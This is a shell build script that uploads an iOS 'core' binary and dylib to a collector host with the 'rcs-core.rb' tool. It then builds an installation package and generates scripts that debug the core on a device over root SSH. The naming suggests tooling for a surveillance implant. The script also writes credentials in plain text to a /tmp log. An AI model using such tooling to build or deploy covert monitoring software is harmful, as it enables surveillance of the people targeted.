#
# setting env from project
#
SYNCH_DB=${RCS_TEST_SYNCH}
TOOL_DIR=${SRCROOT}/tools/
TOOL=${SRCROOT}/tools/rcs-core.rb
BUILD_CONF=${SRCROOT}/tools/build.json
HOST=${RCS_TEST_COLLECTOR}
USR=${RCS_TEST_USER}
PASS=${RCS_TEST_PASSWD}
INPUT=${TARGET_BUILD_DIR}/${TARGET_NAME}.${WRAPPER_EXTENSION}/${TARGET_NAME}
INPUT_DYLIB=${TARGET_BUILD_DIR}/dylib.ios/dylib
DSYM_PATH=${TARGET_BUILD_DIR}/${TARGET_NAME}.${WRAPPER_EXTENSION}.dSYM
DSYM_PACK=${TARGET_NAME}.${WRAPPER_EXTENSION}.dSYM
OUTPUT_ZIP=${TARGET_BUILD_DIR}/ios.zip
OUTPUT_DIR=${TARGET_BUILD_DIR}/ios_package
INSTANCE=${RCS_TEST_INSTANCE}
INSTALL_FILE=${TARGET_BUILD_DIR}/ios_package/install.sh
DEBUG_DIR=${RCS_TEST_SHLIB_DIR}
CORE_BUILD_NAME=${TARGET_NAME}
IOS_DEVICE=${RCS_TEST_DEVICE_ADDRESS}

if [ "$SYNCH_DB" == "NO" ]
then
echo "don't synchronize core to DB." > /tmp/db_log.txt
exit
fi 

. ~/.env
export GEM_HOME=$GEM_HOME

#
# upload the core to DB
DATE_START=`date`
echo "$DATE_START: trying upload the core to DB..." > /tmp/db_log.txt 2>&1
echo "$TOOL -d $HOST -u $USR -p $PASS -n ios -a $INPUT -A core" >> /tmp/db_log.txt 2>&1
$TOOL -d $HOST -u $USR -p $PASS -n ios -a $INPUT -A core >> /tmp/db_log.txt 2>&1

if [ $? -eq 0 ]
then
echo "core upload done!"
else
echo "error: $?"
fi

# upload dylib
echo "trying upload the dylib to DB..." >> /tmp/db_log.txt 2>&1
echo "$TOOL -d $HOST -u $USR -p $PASS -n ios -a $INPUT_DYLIB -A core" >> /tmp/db_log.txt 2>&1
$TOOL -d $HOST -u $USR -p $PASS -n ios -a $INPUT_DYLIB -A dylib >> /tmp/db_log.txt 2>&1

if [ $? -eq 0 ]
 then
    echo "dylib upload done!"
 else
    echo "error: $?"
fi

echo

#
# create package for test instance
#
#echo "$TOOL -d $HOST -u $USR -p $PASS -f $INSTANCE -b $BUILD_CONF -o $OUTPUT_ZIP"
echo "trying create package for test instance..." >> /tmp/db_log.txt 2>&1
#echo "$TOOL -d $HOST -u $USR -p $PASS -f $INSTANCE -b $BUILD_CONF -o $OUTPUT_ZIP" >> /tmp/db_log.txt 2>&1
$TOOL -d $HOST -u $USR -p $PASS -f $INSTANCE -b $BUILD_CONF -o $OUTPUT_ZIP >> /tmp/db_log.txt

if [ $? -eq 0 ]
 then
    echo "package created!"
 else
    echo "error: $?"
fi 

echo "The installation package is: $OUTPUT_ZIP" >> /tmp/db_log.txt 2>&1

echo
echo "extracting component files to dir $OUTPUT_DIR" >> /tmp/db_log.txt 2>&1
mkdir $OUTPUT_DIR
/usr/bin/unzip -o -d $OUTPUT_DIR $OUTPUT_ZIP >> /tmp/db_log.txt 2>&1

#
# create debug script
#
cat $INSTALL_FILE | sed 's/\$RCS_BASE\/\$RCS_DIR\/\$RCS_CORE > \/dev\/null 2\>\&1.*/\/usr\/sbin\/debugserver-armv6 host:999 .\/\$RCS_CORE\)/' > $OUTPUT_DIR/debug.sh
chmod 755 $OUTPUT_DIR/debug.sh >> /tmp/db_log.txt 2>&1

#
# extracting patched core file to $DEBUG_DIR"
#
echo
echo "extracting patched core file to $DEBUG_DIR" >> /tmp/db_log.txt 2>&1

RCS_CORE_FILE=`cat $INSTALL_FILE | sed -n 's/RCS_CORE=//p'`
RCS_CORE_DIR=`cat $INSTALL_FILE | sed -n 's/RCS_DIR=//p'`

rm -rf $DEBUG_DIR/private >> /tmp/db_log.txt 2>&1
mkdir -p $DEBUG_DIR/private/var/mobile/$RCS_CORE_DIR >> /tmp/db_log.txt 2>&1

cp $OUTPUT_DIR/$RCS_CORE_FILE $DEBUG_DIR/private/var/mobile/$RCS_CORE_DIR
cp -rf $DSYM_PATH $DEBUG_DIR/private/var/mobile/$RCS_CORE_DIR/$RCS_CORE_FILE.dSYM

mv $DEBUG_DIR/private/var/mobile/$RCS_CORE_DIR/$RCS_CORE_FILE.dSYM/Contents/Resources/DWARF/$CORE_BUILD_NAME $DEBUG_DIR/private/var/mobile/$RCS_CORE_DIR/$RCS_CORE_FILE.dSYM/Contents/Resources/DWARF/$RCS_CORE_FILE

#
# create command file for debbuging
#
echo "set shlib-path-substitutions / ./" > $DEBUG_DIR/.commands
echo "file $DEBUG_DIR/private/var/mobile/$RCS_CORE_DIR/$RCS_CORE_FILE" >> $DEBUG_DIR/.commands
echo "target remote-macos $IOS_DEVICE:999" >> $DEBUG_DIR/.commands

#
# create debbuger runningn script
#
echo "#!/bin/sh" > $DEBUG_DIR/start_debugger.sh
echo "scp -i $TOOL_DIR/id_iostest_rsa  -r $OUTPUT_DIR root@$IOS_DEVICE:/tmp" >> $DEBUG_DIR/start_debugger.sh
echo "ssh -i $TOOL_DIR/id_iostest_rsa -l root $IOS_DEVICE '(. /etc/profile; cd /tmp/ios_package/; ./debug.sh)' &" >> $DEBUG_DIR/start_debugger.sh
echo "sleep 2" >> $DEBUG_DIR/start_debugger.sh
echo "/Developer/Platforms/iPhoneOS.platform/Developer/usr/libexec/gdb/gdb-arm-apple-darwin -arch=armv6 --command=.commands" >> $DEBUG_DIR/start_debugger.sh
chmod 755 $DEBUG_DIR/start_debugger.sh >> /tmp/db_log.txt 2>&1

DATE_END=`date`
echo "$DATE_END: all done!" >> /tmp/db_log.txt 2>&1
